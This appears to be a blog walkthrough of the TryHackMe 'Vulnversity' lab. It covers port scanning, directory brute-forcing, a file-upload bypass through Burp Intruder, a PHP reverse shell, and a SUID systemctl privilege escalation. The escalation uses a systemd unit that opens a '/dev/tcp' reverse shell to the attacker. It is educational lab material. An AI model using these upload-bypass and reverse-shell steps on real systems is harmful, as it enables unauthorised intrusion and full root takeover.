@@ -1,0 +1,381 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta http-equiv=content-language content="en">
+<meta name=color-scheme content="light dark">
+<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
+<meta name=author content="Kiel Vaughn">
+<meta name=description content="Vulnversity    Vulnversity is the first room in the Offensive Security path on TryHackMe. Below is my walkthrough for the tasks for this room.
+Task 1 Hints  Have you deployed the machine and clicked on complete?   Task 2 Hints  The list of flags at the beginning of this task will be of great help. Have you read the man page for nmap to answer some of these questions?">
+<meta name=keywords content="blog,cybersecurity,personal">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="Vulnversity">
+<meta name=twitter:description content="Vulnversity    Vulnversity is the first room in the Offensive Security path on TryHackMe. Below is my walkthrough for the tasks for this room.
+Task 1 Hints  Have you deployed the machine and clicked on complete?   Task 2 Hints  The list of flags at the beginning of this task will be of great help. Have you read the man page for nmap to answer some of these questions?">
+<meta property="og:title" content="Vulnversity">
+<meta property="og:description" content="Vulnversity    Vulnversity is the first room in the Offensive Security path on TryHackMe. Below is my walkthrough for the tasks for this room.
+Task 1 Hints  Have you deployed the machine and clicked on complete?   Task 2 Hints  The list of flags at the beginning of this task will be of great help. Have you read the man page for nmap to answer some of these questions?">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://www.kielvaughn.com/ctfs/2021-03-21-vulnversity/"><meta property="article:section" content="ctfs">
+<meta property="article:published_time" content="2021-03-21T00:00:00+00:00">
+<meta property="article:modified_time" content="2021-03-21T00:00:00+00:00">
+<title>
+Vulnversity · Kiel Vaughn, CISSP
+</title>
+<link rel=canonical href=http://www.kielvaughn.com/ctfs/2021-03-21-vulnversity/>
+<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
+<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
+<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
+<link rel=apple-touch-icon href=/assets/img/cissp.ico>
+<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
+<meta name=generator content="Hugo 0.88.1">
+</head>
+<body class="preload-transitions colorscheme-dark">
+<main class=wrapper>
+<nav class=navigation>
+<section class=container>
+<a class=navigation-title href=/>
+Kiel Vaughn, CISSP
+</a>
+<input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle>
+<i class="fa fa-bars fa-fw" aria-hidden=true></i>
+</label>
+<ul class=navigation-list>
+<li class=navigation-item>
+<a class=navigation-link href=/whoami/>whoami</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/certifications/>certifications</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/posts/>blog</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
+</li>
+</ul>
+</section>
+</nav>
+<div class=content>
+<section class="container page">
+<article>
+<header>
+<h1 class=title>
+<a class=title-link href=http://www.kielvaughn.com/ctfs/2021-03-21-vulnversity/>
+Vulnversity
+</a>
+</h1>
+</header>
+<h1 id=vulnversity>
+Vulnversity
+<a class=heading-link href=#vulnversity>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h1>
+<p>Vulnversity is the first room in the Offensive Security path on TryHackMe. Below is my walkthrough for the tasks for this room.</p>
+<details><summary><strong>Task 1 Hints</strong></summary>
+<ul>
+<li>Have you deployed the machine and clicked on complete?
+</ul>
+</details>
+<details><summary><strong>Task 2 Hints</strong></summary>
+<ul>
+<li>The list of flags at the beginning of this task will be of great help.
+<li>Have you read the man page for nmap to answer some of these questions?
+</ul>
+</details>
+<details><summary><strong>Task 3 Hints</strong></summary>
+<ul>
+<li>Have you installed gobuster?
+<li>Make sure you pay attention to what port to run this tool on!
+<li>Some of the common wordlists should be more than enough to uncover the directory.
+</ul>
+</details>
+<details><summary><strong>Task 4 Hints</strong></summary>
+<ul>
+<li>Have you intercepted the traffic with Burp Suite or Zap?
+<li>Have you tried to modify the upload file extension with the extension list that is provided?
+<li>Upgrading your shell once you have a foothold is beneficial.
+</ul>
+</details>
+<details><summary><strong>Task 5 Hints</strong></summary>
+<ul>
+<li>Search for how to perform a SUID search on Linux
+<li>GTFOBins can help you with finding out which SUID can be exploited.
+</ul>
+</details>
+<h2 id=walkthrough>
+Walkthrough
+<a class=heading-link href=#walkthrough>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h2>
+<details><summary><strong>Full Walkthrough</strong></summary>
+<h3 id=task-1>
+Task 1
+<a class=heading-link href=#task-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<p>No questions, it just wants you to deploy the box.</p>
+<h3 id=task-2>
+Task 2
+<a class=heading-link href=#task-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1>
+Question 1
+<a class=heading-link href=#question-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>Does not require an answer, just an acknowledgment.</p>
+<h4 id=question-2>
+Question 2
+<a class=heading-link href=#question-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity1.png alt="Vulnversity Task 1 Question 2"></p>
+<p>This can be done with several different methods. I decided to run:</p>
+<p><strong><code>threader3000</code></strong></p>
+<p>and enter the IP address of the box. This returned the following results, which is a total of <strong>6</strong> open ports.</p>
+<p><img src=/assets/img/Vulnversity2.png alt="Vulnversity threader3000"></p>
+<h4 id=question-3>
+Question 3
+<a class=heading-link href=#question-3>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>This question asks for the version of the squid proxy running on the host.</p>
+<p><img src=/assets/img/Vulnversity3.png alt="Vulnversity Task 2 Question 3"></p>
+<p>This can be figured out by letting threader3000 do its default nmap scan.</p>
+<p><img src=/assets/img/Vulnversity4.png alt="Vulnversity nmap"></p>
+<p>The version uncovered is <strong>3.5.12</strong> as shown above.</p>
+<h4 id=question-4>
+Question 4
+<a class=heading-link href=#question-4>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity5.png alt="Vulnversity Task 2 Question 4"></p>
+<p>This one was rather simple. If the <strong>-p-400</strong> flag is used, it scans ports 1-400, so the answer would be <strong>400</strong>.</p>
+<h4 id=question-5>
+Question 5
+<a class=heading-link href=#question-5>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity6.png alt="Vulnversity Task 2 Question 5"></p>
+<p>This was another rather simple question. The answer to this is <strong>dns</strong>. This can be found by running:</p>
+<p><strong><code>nmap --help</code></strong></p>
+<p>and looking for the -n flag under the HOST DISCOVERY section as shown below.</p>
+<p><img src=/assets/img/Vulnversity7.png alt="Vulnversity nmap &ndash;help"></p>
+<h4 id=question-6>
+Question 6
+<a class=heading-link href=#question-6>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity8.png alt="Vulnversity Task 2 Question 6"></p>
+<p>This can be found with the results of the nmap scan for Question 3, which is <strong>Ubuntu</strong>. This can also be done by running:</p>
+<p><strong><code>sudo nmap -O &lt;ip address> --osscan-guess</code></strong></p>
+<h4 id=question-7>
+Question 7
+<a class=heading-link href=#question-7>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity9.png alt="Vulnversity Task 2 Question 7"></p>
+<p>This can also easily be found out from the results of Question 3. It shows that Apache is running on port <strong>3333</strong>.</p>
+<p>This can also be found out by running:</p>
+<p><strong><code>nmap -sV &lt;ip address></code></strong></p>
+<h4 id=question-8>
+Question 8
+<a class=heading-link href=#question-8>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>This is another acknowledgment that you should do proper reconnaissance and just requires you to mark it complete.</p>
+<h3 id=task-3>
+Task 3
+<a class=heading-link href=#task-3>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1-1>
+Question 1
+<a class=heading-link href=#question-1-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>No answer is needed, this just wants you to acknowledge you read the information on gobuster.</p>
+<h4 id=question-2-1>
+Question 2
+<a class=heading-link href=#question-2-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity10.png alt="Vulnversity Task 3 Question 2"></p>
+<p>Let&rsquo;s utilize gobuster for this by running:</p>
+<p><strong><code>gobuster dir -u http://&lt;target ip>:3333 -w /usr/share/wordlists/dirb/common.txt</code></strong></p>
+<p>This will soon return several results.</p>
+<p><img src=/assets/img/Vulnversity11.png alt="Vulnversity gobuster"></p>
+<p>Let&rsquo;s take a look at the <strong>/internal/</strong> path of the website in our browser.</p>
+<p><img src=/assets/img/Vulnversity12.png alt="Vulnversity website /internal/"></p>
+<p>This is the location of the file uploader.</p>
+<h3 id=task-4>
+Task 4
+<a class=heading-link href=#task-4>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1-2>
+Question 1
+<a class=heading-link href=#question-1-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity13.png alt="Vulnversity Task 4 Question 1"></p>
+<p>After some trial and error, it appears that .php files are blocked as shown below.</p>
+<p><img src=/assets/img/Vulnversity14.png alt="Vulnversity shell.php upload"></p>
+<h4 id=question-2-2>
+Question 2
+<a class=heading-link href=#question-2-2>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>This question has no required answer and just wants you to acknowledge that you have a basic understanding of Burp Suite.</p>
+<h4 id=question-3-1>
+Question 3
+<a class=heading-link href=#question-3-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity15.png alt></p>
+<p>For this question, let&rsquo;s create the extension list provided. First, lets run:</p>
+<p><strong><code>nano phpext.txt</code></strong></p>
+<p>Once here, add in the following extensions and save the file.</p>
+<p><img src=/assets/img/Vulnversity16.png alt="Vulnversity PHP extensions"></p>
+<p>Next, start up Burp Suite and have it intercept traffic with the proxy (which is on by default). Refresh the page with the <strong>/internal/</strong> directory and allow this traffic to be forwarded. Next, try to upload a <a href=https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>reverse PHP shell</a> that has been modified to add in your IP address and port of your choosing.</p>
+<p>You should see a screen similar to the one below that is being uploaded</p>
+<p><img src=/assets/img/Vulnversity17.png alt="Vulnversity Burp Suite 1"></p>
+<p>Next, right click and click on <strong>Send to Intruder</strong> and then click on the <strong>Intruder</strong> tab and then the <strong>Positions</strong> section:</p>
+<p><img src=/assets/img/Vulnversity18.png alt="Vulnversity Burp Suite 2"></p>
+<p>Next, click on the <strong>Clear §</strong> button to remove all of the payload positions that were automatically added. Next, highlight the <strong>.php</strong> extension of the shell.php file name and click on <strong>Add §</strong> button.</p>
+<p><img src=/assets/img/Vulnversity19.png alt="Vulnversity Burp Suite 3"></p>
+<p>Next, click on the <strong>Payloads</strong> section and under <strong>Payload Options</strong> click on the <strong>Load &mldr;</strong> button. Navigate to the <strong>phpext.txt</strong> file you created and click on <strong>Open</strong>.</p>
+<p><img src=/assets/img/Vulnversity20.png alt="Vulnversity Burp Suite 4"></p>
+<p>Next, at the bottom of the page, uncheck the <strong>URL-encode these characters:"</strong> box and then click on <strong>Start Attack</strong>.</p>
+<p>A response window should appear, and there is one that has a shorter length than the rest (.phtml) Let&rsquo;s take a look at that response and by clicking on it and then clicking on <strong>Response</strong>.</p>
+<p><img src=/assets/img/Vulnversity21.png alt="Vulnversity Burp Suite 5"></p>
+<p>You will notice that this says <strong>Success</strong>, which means this file upload type is allowed. This tells us that <strong>.phtml</strong> files are allowed which answers this question.</p>
+<h4 id=question-4-1>
+Question 4
+<a class=heading-link href=#question-4-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p>I sort of jumped the gun and we had already downloaded the recommended PHP reverse shell, so you can skip most of this section. The only thing you would need to do is on your attacker host, run:</p>
+<p><strong><code>nc -nvlp &lt;port number></code></strong> to catch the reverse shell. Where the port number is the one you defined in the reverse shell file.</p>
+<p><img src=/assets/img/Vulnversity22.png alt="Vulnversity nc listener"></p>
+<p>Next, in your browser, navigate to <strong>http://&lt;target IP address>:3333/internal/uploads/shell.phtml</strong>. In a few moments you should have a shell onto the victim machine.</p>
+<p><img src=/assets/img/Vulnversity23.png alt="Vulnversity initial foothold"></p>
+<h4 id=question-5-1>
+Question 5
+<a class=heading-link href=#question-5-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity24.png alt="Vulnversity Task 4 Question 5"></p>
+<p>This question is answered rather easily. Let&rsquo;s run:</p>
+<p><strong><code>cd /home</code></strong></p>
+<p>followed by</p>
+<p><strong><code>ls</code></strong></p>
+<p>and you should get the following result which answers this question as there is only one home directory listed (<strong>bill</strong>).</p>
+<p><img src=/assets/img/Vulnversity25.png alt="Vulnversity user name"></p>
+<h4 id=question-6-1>
+Question 6
+<a class=heading-link href=#question-6-1>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity26.png alt="Vulnversity Task 4 Question 6"></p>
+<p>For this, let&rsquo;s take a look in bill&rsquo;s home folder. Since we&rsquo;re already in the <strong>/home</strong> directory, let&rsquo;s just type in:</p>
+<p><strong><code>cd bill</code></strong></p>
+<p>and then follow this up with:</p>
+<p><strong><code>ls</code></strong></p>
+<p>the user.txt file should be present here, which can be displayed with:</p>
+<p><strong><code>cat user.txt</code></strong></p>
+<p><img src=/assets/img/Vulnversity27.png alt="Vulnversity user flag"></p>
+<h3 id=task-5>
+Task 5
+<a class=heading-link href=#task-5>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h3>
+<h4 id=question-1-3>
+Question 1
+<a class=heading-link href=#question-1-3>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity28.png alt="Vulnversity Task 5 Question 1"></p>
+<p>There are several different ways to find the answer to this question. The one provided in the hint is not the most efficient method, as it does not filter out error messages. Let&rsquo;s utilize this command instead:</p>
+<p><strong><code>find / -user root -perm -4000 -print 2>/dev/null</code></strong></p>
+<p>This will find all SUID files and send the error messages to /dev/null so they are not displayed on your screen. This gives us a much shorter list of items to look at.</p>
+<p><img src=/assets/img/Vulnversity29.png alt="Vulnversity SUID files"></p>
+<p>One that stands out is <strong>systemctl</strong>, which can be utilized with privilege escalation. The answer to this question is <strong>/bin/systemctl</strong>.</p>
+<h4 id=question-2-3>
+Question 2
+<a class=heading-link href=#question-2-3>
+<i class="fa fa-link" aria-hidden=true></i>
+</a>
+</h4>
+<p><img src=/assets/img/Vulnversity30.png alt="Vulnversity Task 5 Question 2"></p>
+<p><a href=https://gtfobins.github.io/gtfobins/systemctl/>GTFOBins </a> has a pretty good guide on how to get root by abusing the systemctl SUID. The example they provide shows you how to run the id command as root, which is not really useful to us. Let&rsquo;s modify the command listed to the following:</p>
+<p>Before running this, on our attacker computer, let&rsquo;s run the following:</p>
+<p><strong><code>nc -nvlp 4242</code></strong></p>
+<p><img src=/assets/img/Vulnversity31.png alt="Vulnversity nc listener root shell"></p>
+<p>This will be utilized to catch the bash shell after running the command below.</p>
+<p><strong><code>sudo install -m =xs $(which systemctl) .</code></strong></p>
+<p><strong><code>TF=$(mktemp).service</code></strong>
+<strong><code>echo '[Service]</code></strong>
+<strong><code>Type=oneshot</code></strong>
+<strong><code>ExecStart=/bin/bash -c "bash -i >& /dev/tcp/&lt;attacker ip>/4242 0>&1"</code></strong>
+<strong><code>[Install]</code></strong>
+<strong><code>WantedBy=multi-user.target' > $TF</code></strong>
+<strong><code>./systemctl link $TF</code></strong>
+<strong><code>./systemctl enable --now $TF</code></strong></p>
+<p><img src=/assets/img/Vulnversity32.png alt="Vulnversity systemctl abuse"></p>
+<p>Next, let&rsquo;s run:</p>
+<p><strong><code>/bin/systemctl start /tmp/tmp.&lt;randomly generated characters>.service</code></strong></p>
+<p><img src=/assets/img/Vulnversity33.png alt="Vulnversity systemctl start"></p>
+<p>If you go back to your listener on port 4242, you should now have a root shell!</p>
+<p><img src=/assets/img/Vulnversity34.png alt="Vulnversity root shell"></p>
+<p>Now, we can run the following to navigate to the root user&rsquo;s home directory, list the contents, and print out the root flag:</p>
+<p><strong><code>cd /root</code></strong></p>
+<p><strong><code>ls</code></strong></p>
+<p><strong><code>cat root.txt</code></strong></p>
+<p><img src=/assets/img/Vulnversity35.png alt="Vulnversity root flag"></p>
+</details>
+</article>
+</section>
+</div>
+<footer class=footer>
+<section class=container>
+©
+2020 -
+2021
+Kiel Vaughn
+</section>
+</footer>
+</main>
+<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
+</body>
+</html>
